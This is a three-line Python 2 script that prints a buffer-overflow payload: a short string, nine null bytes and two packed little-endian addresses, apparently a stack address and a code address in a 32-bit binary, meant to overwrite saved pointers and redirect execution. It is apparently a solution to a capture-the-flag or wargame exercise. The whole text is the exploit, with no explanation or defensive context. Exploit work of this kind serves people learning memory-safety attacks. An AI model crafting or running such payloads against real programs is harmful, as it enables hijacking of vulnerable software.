from struct import pack

print "aaa" + "\x00"*9 + pack("<I", 0xbffea448) + pack("<I", 0x08048efe)
